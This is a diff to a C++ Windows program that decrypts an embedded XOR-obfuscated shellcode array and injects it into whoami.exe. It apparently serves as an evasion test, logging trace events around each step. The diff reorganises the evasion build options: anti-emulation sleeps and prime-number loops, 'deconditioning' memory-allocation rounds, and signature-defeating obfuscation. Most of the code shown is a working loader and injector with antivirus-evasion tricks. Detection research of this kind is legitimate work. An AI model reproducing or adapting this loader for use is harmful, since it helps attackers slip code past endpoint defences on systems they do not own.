@@ -7,9 +7,6 @@
 #include <thread>
 #include <TraceLoggingProvider.h>
 
-
-// paths
-std::string outFile = "C:\\Users\\Public\\Downloads\\attack-output.csv";
 LPCWSTR procToInject = L"C:\\Windows\\System32\\whoami.exe";
 
 // my attack provider
@@ -48,8 +45,10 @@ int main(int argc, char** argv) {
     std::string fail = "[!] ";
     std::string ok = "[+] ";
 
-    // anti_emulation should be one of the first actions in the EXE
-#if defined anti_emulation_sleep
+    // antiEmulation should be one of the first actions in the EXE
+    // deconditioning depends on anti_emulation + obfuscation (anti-signature)
+#if defined antiEmulation || defined deconditioning
+    /*
     msg << "Doing anti emulation sleep for 5 sec";
     print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
     auto start_ae_sleep = std::chrono::high_resolution_clock::now();
@@ -58,10 +57,8 @@ int main(int argc, char** argv) {
     auto ae_sleep_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_sleep - start_ae_sleep).count();
     msg << "Slept for approximately " << ae_sleep_elapsed << " ms";
     print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-#endif
+    */
 
-    // deconditioning depends on anti_emulation + obfuscation (anti-signature)
-#if defined anti_emulation_calc || defined deconditioning_alloc || defined  deconditioning_calc
     msg << "Doing anti emulation calc operations for about 5 sec";
     print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
     auto start_ae_calc = std::chrono::high_resolution_clock::now();
@@ -100,14 +97,10 @@ int main(int argc, char** argv) {
     msg << "standard";
 #elif defined obfuscation
     msg << "obfuscation";
-#elif defined anti_emulation_sleep
-    msg << "anti_emulation_sleep";
-#elif defined anti_emulation_calc
-    msg << "anti_emulation_calc";
-#elif defined deconditioning_alloc
-    msg << "deconditioning_alloc";
-#elif defined deconditioning_calc
-    msg << "deconditioning_calc";
+#elif defined antiEmulation
+    msg << "antiEmulation+obfuscation";
+#elif defined deconditioning
+    msg << "deconditioning+antiEmulation+obfuscation";
 #else
     msg << "Release";
     // handle start params only in 'Release' config
@@ -161,7 +154,20 @@ int main(int argc, char** argv) {
     print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
     Sleep(sleep_between_steps_ms);
 
-#if defined deconditioning_alloc // https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/sirallocalot.c
+#if defined deconditioning // https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/sirallocalot.c
+    /*
+    msg << "Doing deconditioning calc operations for about 60 sec";
+    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
+    auto start_decon_calc = std::chrono::high_resolution_clock::now();
+    volatile bool dummy_decon_calc; // do no optimze "calc prime" loop away
+    for (UINT64 n = 2; n <= 90'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_decon_calc = pr; }
+    auto end_decon_calc = std::chrono::high_resolution_clock::now();
+    auto decon_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_decon_calc - start_decon_calc).count();
+    msg << "Calculated for approximately " << decon_calc_elapsed << " ms";
+    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
+    Sleep(sleep_between_steps_ms);
+    */
+
     BYTE nonsense[4096] = {};
     constexpr int rounds = 100;
     int repetitions = 10; // one repetition is about 0.01 sec (with waiting for thread and freeing memory), according to CPU time with Get-Process
@@ -225,27 +231,14 @@ int main(int argc, char** argv) {
     }
 #endif
 
-#if defined deconditioning_calc
-    msg << "Doing deconditioning calc operations for about 60 sec";
-    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-    auto start_decon_calc = std::chrono::high_resolution_clock::now();
-    volatile bool dummy_decon_calc; // do no optimze "calc prime" loop away
-    for (UINT64 n = 2; n <= 90'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_decon_calc = pr; }
-    auto end_decon_calc = std::chrono::high_resolution_clock::now();
-    auto decon_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_decon_calc - start_decon_calc).count();
-    msg << "Calculated for approximately " << decon_calc_elapsed << " ms";
-    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-    Sleep(sleep_between_steps_ms);
-#endif
-
     // antiemulation and deconditioning also depend on obfuscation (anti signature)
-#if defined obfuscation || defined antiemulation_sleep || defined antiemulation_calc || defined deconditioning_alloc || defined deconditioning_calc
+#if defined obfuscation || defined antiEmulation || defined deconditioning
     msg << "Before decrypting shellcode";
     print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
     
     // https://cyberchef.org/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=
     BYTE shellcode[] = { 0xbd,0x0a,0xc2,0xa6,0xb1,0xaa,0x81,0x42,0x41,0x42,0x00,0x13,0x00,0x12,0x13,0x13,0x17,0x0a,0x70,0x90,0x24,0x0a,0xca,0x10,0x21,0x0a,0xca,0x10,0x59,0x0a,0xca,0x10,0x61,0x0a,0xca,0x30,0x11,0x0a,0x4e,0xf5,0x0b,0x08,0x0c,0x73,0x88,0x0a,0x70,0x82,0xed,0x7e,0x20,0x3e,0x43,0x6e,0x61,0x03,0x80,0x8b,0x4c,0x03,0x40,0x83,0xa3,0xaf,0x13,0x03,0x10,0x0a,0xca,0x10,0x61,0xc9,0x03,0x7e,0x09,0x43,0x91,0xc9,0xc1,0xca,0x41,0x42,0x41,0x0a,0xc4,0x82,0x35,0x25,0x09,0x43,0x91,0x12,0xca,0x0a,0x59,0x06,0xca,0x02,0x61,0x0b,0x40,0x92,0xa2,0x14,0x09,0xbd,0x88,0x03,0xca,0x76,0xc9,0x0a,0x40,0x94,0x0c,0x73,0x88,0x0a,0x70,0x82,0xed,0x03,0x80,0x8b,0x4c,0x03,0x40,0x83,0x79,0xa2,0x34,0xb3,0x0d,0x41,0x0d,0x66,0x49,0x07,0x78,0x93,0x34,0x9a,0x19,0x06,0xca,0x02,0x65,0x0b,0x40,0x92,0x27,0x03,0xca,0x4e,0x09,0x06,0xca,0x02,0x5d,0x0b,0x40,0x92,0x00,0xc9,0x45,0xca,0x09,0x43,0x91,0x03,0x19,0x03,0x19,0x1c,0x18,0x18,0x00,0x1a,0x00,0x1b,0x00,0x18,0x09,0xc1,0xad,0x62,0x00,0x10,0xbe,0xa2,0x19,0x03,0x18,0x18,0x09,0xc9,0x53,0xab,0x16,0xbd,0xbe,0xbd,0x1c,0x0a,0xfb,0x43,0x41,0x42,0x41,0x42,0x41,0x42,0x41,0x0a,0xcc,0xcf,0x40,0x43,0x41,0x42,0x00,0xf8,0x70,0xc9,0x2e,0xc5,0xbe,0x97,0xfa,0xb2,0xf4,0xe0,0x17,0x03,0xfb,0xe4,0xd4,0xff,0xdc,0xbd,0x94,0x0a,0xc2,0x86,0x69,0x7e,0x47,0x3e,0x4b,0xc2,0xba,0xa2,0x34,0x47,0xfa,0x05,0x52,0x30,0x2e,0x28,0x41,0x1b,0x00,0xcb,0x9b,0xbd,0x94,0x21,0x20,0x2e,0x22,0x6c,0x24,0x3a,0x24,0x42 };
-    for (size_t i = 0; i < sizeof(shellcode) / sizeof(shellcode[0]); ++i) { shellcode[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
+    for (size_t i = 0; i < sizeof(shellcode); ++i) { shellcode[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
     
     msg << "After decrypting shellcode";
     print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
@@ -306,10 +299,10 @@ int main(int argc, char** argv) {
         return 1;
     }
 
+    /*
     msg << "Before reading memory to verify write";
     print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
 
-    /*
     // read written bytes back for verification
     BYTE verify_buf[sizeof(shellcode)] = { 0 };
     SIZE_T bytes_read;
